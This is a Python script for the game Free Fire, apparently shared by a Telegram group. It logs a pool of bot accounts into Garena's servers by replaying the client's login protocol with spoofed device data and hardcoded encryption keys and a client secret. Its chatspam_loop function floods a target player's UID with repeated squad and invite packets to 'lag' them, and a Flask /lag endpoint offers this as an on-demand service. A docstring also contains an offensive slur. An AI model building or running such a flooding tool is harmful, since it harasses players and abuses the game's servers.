#!/usr/bin/env python3
#FULL CREDIT GOES TO RIZER 
# CHANNEL @beotherjkman and Group beotherjkmans
import asyncio
import threading
import time
import json
import os
import random
import binascii
import traceback
from datetime import datetime
from typing import Dict, Optional, Tuple, List

import aiohttp
from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()


DESCRIPTOR_MLR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR_MLR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR_MLR, 'MajorLoginReq_pb2', _globals)
if not _descriptor._USE_C_DESCRIPTORS:
    DESCRIPTOR_MLR._loaded_options = None
MajorLogin = _globals.get('MajorLogin')


DESCRIPTOR_MLRES = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"|\n\rMajorLoginRes\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04\x12\x0e\n\x06region\x18\x02 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03url\x18\n \x01(\t\x12\x11\n\ttimestamp\x18\x15 \x01(\x03\x12\x0b\n\x03key\x18\x16 \x01(\x0c\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3')
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR_MLRES, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR_MLRES, 'MajorLoginRes_pb2', _globals)
if not _descriptor._USE_C_DESCRIPTORS:
    DESCRIPTOR_MLRES._loaded_options = None
MajorLoginRes = _globals.get('MajorLoginRes')


DESCRIPTOR_PORTS = _descriptor_pool.Default().AddSerializedFile(b'\n\x15GetLoginDataRes.proto\"\xa4\x01\n\x0cGetLoginData\x12\x12\n\nAccountUID\x18\x01 \x01(\x04\x12\x0e\n\x06Region\x18\x03 \x01(\t\x12\x13\n\x0b\x41\x63\x63ountName\x18\x04 \x01(\t\x12\x16\n\x0eOnline_IP_Port\x18\x0e \x01(\t\x12\x0f\n\x07\x43lan_ID\x18\x14 \x01(\x03\x12\x16\n\x0e\x41\x63\x63ountIP_Port\x18  \x01(\t\x12\x1a\n\x12\x43lan_Compiled_Data\x18\x37 \x01(\tb\x06proto3')
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR_PORTS, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR_PORTS, 'GetLoginDataRes_pb2', _globals)
if not _descriptor._USE_C_DESCRIPTORS:
    DESCRIPTOR_PORTS._loaded_options = None
GetLoginData = _globals.get('GetLoginData')



def _encode_varint(value: int) -> bytes:
    result = []
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        result.append(byte)
        if not value:
            break
    return bytes(result)

async def CrEaTe_ProTo(fields: dict) -> bytes:
    packet = bytearray()
    for field, value in fields.items():
        field_num = int(field)
        if isinstance(value, dict):
            nested = await CrEaTe_ProTo(value)
            packet.extend(_encode_varint((field_num << 3) | 2))
            packet.extend(_encode_varint(len(nested)))
            packet.extend(nested)
        elif isinstance(value, int):
            packet.extend(_encode_varint((field_num << 3) | 0))
            packet.extend(_encode_varint(value))
        elif isinstance(value, str):
            data = value.encode('utf-8')
            packet.extend(_encode_varint((field_num << 3) | 2))
            packet.extend(_encode_varint(len(data)))
            packet.extend(data)
        elif isinstance(value, bytes):
            packet.extend(_encode_varint((field_num << 3) | 2))
            packet.extend(_encode_varint(len(value)))
            packet.extend(value)
    return bytes(packet)

async def EnC_AEs(hex_data: str) -> str:
    key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
    iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(bytes.fromhex(hex_data), AES.block_size)
    return cipher.encrypt(padded).hex()

async def EnC_PacKeT(hex_data: str, key: bytes, iv: bytes) -> str:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(bytes.fromhex(hex_data), 16)
    return cipher.encrypt(padded).hex()

async def DecodE_HeX(num: int) -> str:
    h = hex(num)[2:]
    return h if len(h) % 2 == 0 else '0' + h

async def GeneRaTePk(payload_hex: str, packet_type: str, key: bytes, iv: bytes) -> bytes:
    encrypted = await EnC_PacKeT(payload_hex, key, iv)
    length = len(encrypted) // 2
    len_hex = await DecodE_HeX(length)
    if len(len_hex) == 2:
        header = packet_type + "000000"
    elif len(len_hex) == 3:
        header = packet_type + "00000"
    elif len(len_hex) == 4:
        header = packet_type + "0000"
    elif len(len_hex) == 5:
        header = packet_type + "000"
    else:
        header = packet_type + "000000"
    final = header + len_hex + encrypted
    return bytes.fromhex(final)

async def EnC_Uid(uid: int, tp: str) -> str:
    e = []
    val = uid
    while val:
        e.append((val & 0x7F) | (0x80 if val > 0x7F else 0))
        val >>= 7
    return bytes(e).hex()



async def get_access_token(uid: str, password: str) -> Tuple[Optional[str], Optional[str]]:
    url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    headers = {
        "Host": "100067.connect.garena.com",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    data = {
        "uid": uid,
        "password": password,
        "response_type": "token",
        "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067"
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, data=data) as resp:
            if resp.status == 200:
                js = await resp.json()
                return js.get("open_id"), js.get("access_token")
    return None, None

async def major_login(open_id: str, access_token: str) -> Optional[Dict]:
    req = MajorLogin()
    req.event_time = str(datetime.now())[:-7]
    req.game_name = "free fire"
    req.platform_id = 4
    req.client_version = "1.123.1"
    req.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
    req.system_hardware = "Handheld"
    req.telecom_operator = "Verizon"
    req.network_type = "WIFI"
    req.screen_width = 1920
    req.screen_height = 1080
    req.screen_dpi = "280"
    req.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    req.memory = 3003
    req.gpu_renderer = "Adreno (TM) 640"
    req.gpu_version = "OpenGL ES 3.1 v1.46"
    req.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    req.client_ip = "223.191.51.89"
    req.language = "en"
    req.open_id = open_id
    req.open_id_type = "4"
    req.device_type = "Handheld"
    req.memory_available.version = 55
    req.memory_available.hidden_value = 81
    req.access_token = access_token
    req.platform_sdk_id = 1
    req.network_operator_a = "Verizon"
    req.network_type_a = "WIFI"
    req.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    req.external_storage_total = 36235
    req.external_storage_available = 31335
    req.internal_storage_total = 2519
    req.internal_storage_available = 703
    req.game_disk_storage_available = 25010
    req.game_disk_storage_total = 26628
    req.external_sdcard_avail_storage = 32992
    req.external_sdcard_total_storage = 36235
    req.login_by = 3
    req.cpu_type = 2
    req.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
    req.reg_avatar = 1
    req.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
    req.channel_type = 3
    req.cpu_architecture = "2"
    req.client_version_code = "2019118695"
    req.graphics_api = "OpenGLES2"
    req.supported_astc_bitset = 16383
    req.login_open_id_type = 4
    req.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg=="
    req.loading_time = 13564
    req.release_channel = "android"
    req.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
    req.android_engine_init_flag = 110009
    req.if_push = 1
    req.is_vpn = 1
    req.origin_platform_type = "4"
    req.primary_platform_type = "4"
    serialized = req.SerializeToString()
    encrypted = await EnC_AEs(serialized.hex())

    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        "X-Unity-Version": "2018.4.11f1",
        "ReleaseVersion": "OB53",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-GA": "v1 1",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)",
        "Host": "loginbp.ggblueshark.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=bytes.fromhex(encrypted), headers=headers, ssl=False) as resp:
            if resp.status != 200:
                print(f"MajorLogin HTTP {resp.status}")
                return None
            data = await resp.read()
            res = MajorLoginRes()
            res.ParseFromString(data)
            if not res.key or not res.iv:
                print("Missing key/iv in MajorLogin response")
                return None
            return {
                "key": res.key,
                "iv": res.iv,
                "token": res.token,
                "account_uid": res.account_uid,
                "url": res.url,
                "region": res.region,
                "timestamp": res.timestamp
            }

async def get_login_data(base_url: str, major_login_payload_hex: str, token: str) -> Optional[Dict]:
    url = f"{base_url}/GetLoginData"
    headers = {
        "Authorization": f"Bearer {token}",
        "X-Unity-Version": "2018.4.11f1",
        "ReleaseVersion": "OB53",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-GA": "v1 1",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)",
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=bytes.fromhex(major_login_payload_hex), headers=headers, ssl=False) as resp:
            if resp.status != 200:
                print(f"GetLoginData HTTP {resp.status}")
                return None
            data = await resp.read()
            res = GetLoginData()
            res.ParseFromString(data)
            if not res.Online_IP_Port or not res.AccountIP_Port:
                print("Missing IP/Port in GetLoginData response")
                return None
            return {
                "online_ip_port": res.Online_IP_Port,
                "chat_ip_port": res.AccountIP_Port,
                "account_name": res.AccountName
            }

async def xAuThSTarTuP(account_uid: int, token: str, timestamp: int, key: bytes, iv: bytes) -> str:
    uid_hex = hex(account_uid)[2:]
    uid_len = len(uid_hex)
    encrypted_timestamp = await DecodE_HeX(timestamp)
    encrypted_token = token.encode().hex()
    encrypted_packet = await EnC_PacKeT(encrypted_token, key, iv)
    pkt_len = len(encrypted_packet) // 2
    pkt_len_hex = hex(pkt_len)[2:]
    if uid_len == 9:
        headers = '0000000'
    elif uid_len == 8:
        headers = '00000000'
    elif uid_len == 10:
        headers = '000000'
    else:
        headers = '0000000'
    return f"0115{headers}{uid_hex}{encrypted_timestamp}00000{pkt_len_hex}{encrypted_packet}"



async def OpEnSq(key: bytes, iv: bytes, region: str) -> bytes:
    fields = {
        1: 1,
        2: {
            2: "\u0001", 3: 1, 4: 1, 5: "en", 9: 1, 11: 1, 13: 1,
            14: {2: 5756, 6: 11, 8: "1.111.5", 9: 2, 10: 4}
        }
    }
    ptype = '0514' if region.lower() == 'ind' else '0519'
    return await GeneRaTePk((await CrEaTe_ProTo(fields)).hex(), ptype, key, iv)

async def cHSq(num: int, target_uid: int, key: bytes, iv: bytes, region: str) -> bytes:
    fields = {1: 17, 2: {1: target_uid, 2: 1, 3: num-1, 4: 62, 5: "\u001a", 8: 5, 13: 329}}
    ptype = '0514' if region.lower() == 'ind' else '0519'
    return await GeneRaTePk((await CrEaTe_ProTo(fields)).hex(), ptype, key, iv)

async def SEnd_InV(num: int, target_uid: int, key: bytes, iv: bytes, region: str) -> bytes:
    fields = {1: 2, 2: {1: target_uid, 2: region.upper(), 4: num}}
    ptype = '0514' if region.lower() == 'ind' else '0519'
    return await GeneRaTePk((await CrEaTe_ProTo(fields)).hex(), ptype, key, iv)

async def ExiT(key: bytes, iv: bytes) -> bytes:
    fields = {1: 7, 2: {1: 0}}
    return await GeneRaTePk((await CrEaTe_ProTo(fields)).hex(), '0515', key, iv)


async def GeT_Status(uid: int, key: bytes, iv: bytes) -> bytes:
    uid_enc = await EnC_Uid(uid, 'Uid')
    if len(uid_enc) == 8:
        pk = f'080112080a04{uid_enc}1005'
    elif len(uid_enc) == 10:
        pk = f"080112090a05{uid_enc}1005"
    else:
        pk = f'080112090a05{uid_enc}1005'
    return await GeneRaTePk(pk, '0f15', key, iv)

async def chatspam_loop(bot, target_uid: int, duration_seconds: int = 40):
    """
 BLACK IS GAY
    """
    try:
        print(f"{bot.log_prefix} Opening squad...")
        open_pkt = await OpEnSq(bot.key, bot.iv, bot.region)
        bot.online_writer.write(open_pkt)
        await bot.online_writer.drain()
        await asyncio.sleep(0.3)

        print(f"{bot.log_prefix} INVITING {target_uid}...")
        c5 = await cHSq(5, target_uid, bot.key, bot.iv, bot.region)
        bot.online_writer.write(c5)
        await bot.online_writer.drain()
        await asyncio.sleep(0.3)

        inv5 = await SEnd_InV(5, target_uid, bot.key, bot.iv, bot.region)
        bot.online_writer.write(inv5)
        await bot.online_writer.drain()
        await asyncio.sleep(0.3)

        print(f"{bot.log_prefix} LAG STARTED {duration_seconds}s...")
        start_time = time.time()
        count = 0
        last_keepalive = time.time()
        while time.time() - start_time < duration_seconds:

            c6 = await cHSq(6, target_uid, bot.key, bot.iv, bot.region)
            bot.online_writer.write(c6)
            await bot.online_writer.drain()
            inv6 = await SEnd_InV(6, target_uid, bot.key, bot.iv, bot.region)
            bot.online_writer.write(inv6)
            await bot.online_writer.drain()
            await asyncio.sleep(0.1)


            c5 = await cHSq(5, target_uid, bot.key, bot.iv, bot.region)
            bot.online_writer.write(c5)
            await bot.online_writer.drain()
            inv5 = await SEnd_InV(5, target_uid, bot.key, bot.iv, bot.region)
            bot.online_writer.write(inv5)
            await bot.online_writer.drain()
            await asyncio.sleep(0.1)
            count += 1


            now = time.time()
            if now - last_keepalive >= 15:
                ka = await GeT_Status(bot.account_uid, bot.key, bot.iv)
                if ka:
                    bot.online_writer.write(ka)
                    await bot.online_writer.drain()
                last_keepalive = now


        print(f"{bot.log_prefix} Spam finished, leaving squad...")
        leave = await ExiT(bot.key, bot.iv)
        bot.online_writer.write(leave)
        await bot.online_writer.drain()

        print(f"{bot.log_prefix} Chatspam completed for {target_uid} ({count} cycles)")
        return True, f"Spam completed ({count} cycles)"
    except Exception as e:
        print(f"{bot.log_prefix} Chatspam error: {e}")
        traceback.print_exc()
        return False, str(e)



class BotInstance:
    def __init__(self, uid: str, password: str):
        self.uid = uid
        self.password = password
        self.key = None
        self.iv = None
        self.token = None
        self.account_uid = None
        self.region = None
        self.online_writer = None
        self.online_reader = None
        self.keepalive_task = None
        self.reconnect_task = None
        self.is_online = False
        self.busy = False
        self.cooldown_until = 0
        self.lock = asyncio.Lock()
        self.log_prefix = f"[{uid[:6]}...]"
        self._stop_reconnect = False
        self._reconnect_delay = 5

    async def login_and_connect(self):
        """Perform full login and establish TCP connection"""
        print(f"{self.log_prefix} Starting login...")
        open_id, access_token = await get_access_token(self.uid, self.password)
        if not open_id or not access_token:
            raise Exception("Failed to get access token")
        print(f"{self.log_prefix} Got access token")

        login_data = await major_login(open_id, access_token)
        if not login_data:
            raise Exception("MajorLogin failed")
        self.key = login_data["key"]
        self.iv = login_data["iv"]
        self.token = login_data["token"]
        self.account_uid = login_data["account_uid"]
        self.region = login_data["region"]
        base_url = login_data["url"]
        timestamp = login_data["timestamp"]
        print(f"{self.log_prefix} MajorLogin success, account_uid={self.account_uid}")


        req = MajorLogin()
        req.event_time = str(datetime.now())[:-7]
        req.game_name = "free fire"
        req.platform_id = 4
        req.client_version = "1.123.1"
        req.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
        req.system_hardware = "Handheld"
        req.telecom_operator = "Verizon"
        req.network_type = "WIFI"
        req.screen_width = 1920
        req.screen_height = 1080
        req.screen_dpi = "280"
        req.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
        req.memory = 3003
        req.gpu_renderer = "Adreno (TM) 640"
        req.gpu_version = "OpenGL ES 3.1 v1.46"
        req.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
        req.client_ip = "223.191.51.89"
        req.language = "en"
        req.open_id = open_id
        req.open_id_type = "4"
        req.device_type = "Handheld"
        req.memory_available.version = 55
        req.memory_available.hidden_value = 81
        req.access_token = access_token
        req.platform_sdk_id = 1
        req.network_operator_a = "Verizon"
        req.network_type_a = "WIFI"
        req.client_using_version = "7428b253defc164018c604a1ebbfebdf"
        req.external_storage_total = 36235
        req.external_storage_available = 31335
        req.internal_storage_total = 2519
        req.internal_storage_available = 703
        req.game_disk_storage_available = 25010
        req.game_disk_storage_total = 26628
        req.external_sdcard_avail_storage = 32992
        req.external_sdcard_total_storage = 36235
        req.login_by = 3
        req.cpu_type = 2
        req.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
        req.reg_avatar = 1
        req.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
        req.channel_type = 3
        req.cpu_architecture = "2"
        req.client_version_code = "2019118695"
        req.graphics_api = "OpenGLES2"
        req.supported_astc_bitset = 16383
        req.login_open_id_type = 4
        req.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg=="
        req.loading_time = 13564
        req.release_channel = "android"
        req.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
        req.android_engine_init_flag = 110009
        req.if_push = 1
        req.is_vpn = 1
        req.origin_platform_type = "4"
        req.primary_platform_type = "4"
        serialized = req.SerializeToString()
        encrypted_major = await EnC_AEs(serialized.hex())

        server_data = await get_login_data(base_url, encrypted_major, self.token)
        if not server_data:
            raise Exception("GetLoginData failed")
        online_ip, online_port = server_data["online_ip_port"].split(":")
        print(f"{self.log_prefix} Online server: {online_ip}:{online_port}")

        auth_token = await xAuThSTarTuP(int(self.account_uid), self.token, timestamp, self.key, self.iv)
        reader, writer = await asyncio.open_connection(online_ip, int(online_port))
        writer.write(bytes.fromhex(auth_token))
        await writer.drain()
        self.online_reader = reader
        self.online_writer = writer
        self.is_online = True
        print(f"{self.log_prefix} TCP Online connected")


        asyncio.create_task(self._read_responses())


        self.keepalive_task = asyncio.create_task(self._delayed_keep_alive())

    async def _delayed_keep_alive(self):
        """Wait 10 seconds then start periodic keep-alive every 25 seconds"""
        await asyncio.sleep(10)
        while self.is_online:
            try:
                ka = await GeT_Status(self.account_uid, self.key, self.iv)
                if ka and self.online_writer:
                    self.online_writer.write(ka)
                    await self.online_writer.drain()
                    print(f"{self.log_prefix} Keep-alive sent")
                await asyncio.sleep(25)
            except Exception as e:
                print(f"{self.log_prefix} Keep-alive error: {e}")
                self.is_online = False
                break

    async def _read_responses(self):
        """Read incoming data to prevent buffer overflow and detect disconnection"""
        while self.is_online:
            try:
                data = await self.online_reader.read(65535)
                if not data:
                    print(f"{self.log_prefix} Connection closed by server")
                    self.is_online = False
                    break

            except Exception as e:
                print(f"{self.log_prefix} Read error: {e}")
                self.is_online = False
                break

    async def _reconnect_loop(self):
        """Background task to automatically reconnect when offline with exponential backoff"""
        backoff = 5
        while not self._stop_reconnect:
            if not self.is_online and not self.busy:
                print(f"{self.log_prefix} Attempting to reconnect (backoff={backoff}s)...")
                try:
                    await self.login_and_connect()
                    print(f"{self.log_prefix} Reconnected successfully")
                    backoff = 5
                except Exception as e:
                    print(f"{self.log_prefix} Reconnect failed: {e}")
                    await asyncio.sleep(backoff)
                    backoff = min(backoff * 2, 60)
            await asyncio.sleep(5)

    async def start(self):
        """Start the bot and auto-reconnect loop"""
        await self.login_and_connect()
        self._stop_reconnect = False
        self.reconnect_task = asyncio.create_task(self._reconnect_loop())

    async def close(self):
        self._stop_reconnect = True
        self.is_online = False
        if self.keepalive_task:
            self.keepalive_task.cancel()
        if self.reconnect_task:
            self.reconnect_task.cancel()
        if self.online_writer:
            self.online_writer.close()
            await self.online_writer.wait_closed()

    def is_available(self) -> bool:

        if self.busy and hasattr(self, '_busy_start_time') and time.time() - self._busy_start_time > 60:
            print(f"{self.log_prefix} WARNING: Busy flag stuck for >60s, forcing reset")
            self.busy = False
        return self.is_online and not self.busy and time.time() >= self.cooldown_until

    async def spam_target(self, target_uid: int, duration: int = 40) -> Tuple[bool, str]:
        acquired_lock = False
        try:
            async with self.lock:
                if self.busy:
                    return False, "Bot is busy"
                self.busy = True
                self._busy_start_time = time.time()
                acquired_lock = True

            try:
                print(f"{self.log_prefix} Starting spam on {target_uid} for {duration}s")
                success, msg = await chatspam_loop(self, target_uid, duration)
                if success:
                    self.cooldown_until = time.time() + 40
                return success, msg
            except Exception as e:
                return False, str(e)
        finally:
            if acquired_lock:
                async with self.lock:
                    self.busy = False



class AccountManager:
    def __init__(self, accounts_file: str = "accounts.txt"):
        self.bots: List[BotInstance] = []
        self.load_accounts(accounts_file)

    def load_accounts(self, filename: str):
        if not os.path.exists(filename):
            raise FileNotFoundError(f"{filename} not found")
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                uid, pwd = line.split(':', 1)
                self.bots.append(BotInstance(uid, pwd))
        print(f"Loaded {len(self.bots)} accounts from {filename}")

    async def start_all(self):
        tasks = [bot.start() for bot in self.bots]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                print(f"Bot {self.bots[i].uid[:6]}... failed to start: {res}")
            else:
                print(f"Bot {self.bots[i].uid[:6]}... started")

    async def get_available_bot(self) -> Optional[BotInstance]:
        for bot in self.bots:
            if bot.is_available():
                return bot
        return None

    async def spam_target(self, target_uid: int, duration: int = 40) -> Dict:
        bot = await self.get_available_bot()
        if not bot:
            return {"success": False, "message": "No available bot (all busy or offline)"}
        success, msg = await bot.spam_target(target_uid, duration)
        return {"success": success, "message": msg, "bot_uid": bot.uid}



app = Flask(__name__)
manager = None
loop = None

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, loop)
    return future.result()

@app.route('/lag', methods=['GET'])
def lag_endpoint():
    target = request.args.get('uid')
    if not target:
        return jsonify({"success": False, "message": "Missing uid parameter"}), 400
    if not target.isdigit():
        return jsonify({"success": False, "message": "UID must be numeric"}), 400
    target_uid = int(target)
    print(f"Received /lag request for UID {target_uid}")
    result = run_async(manager.spam_target(target_uid, 40))
    return jsonify(result)

@app.route('/status', methods=['GET'])
def status_endpoint():
    bots_status = []
    for bot in manager.bots:
        bots_status.append({
            "uid": bot.uid,
            "online": bot.is_online,
            "busy": bot.busy,
            "cooldown_remaining": max(0, bot.cooldown_until - time.time())
        })
    return jsonify({"bots": bots_status})

def start_flask():
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)



if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    manager = AccountManager("accounts.txt")
    loop.run_until_complete(manager.start_all())

    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()

    try:
        loop.run_forever()
    except KeyboardInterrupt:
        print("Shutting down...")
        for bot in manager.bots:
            loop.run_until_complete(bot.close())